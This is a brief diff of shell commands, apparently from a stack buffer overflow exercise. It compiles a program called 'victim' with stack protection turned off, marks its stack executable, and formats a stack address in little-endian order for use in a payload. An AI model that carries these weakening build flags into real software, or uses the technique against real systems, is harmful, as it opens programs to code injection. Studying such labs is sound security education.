@@ -1,4 +1,4 @@
-gcc -fno-stack-protector -o victim victim.c
+gcc -fno-stack-protector -o victim main.c
 execstack -s victim
 $ a=`printf %016x 0x7fffffffe090 | tac -rs..` 
 $ echo $a 
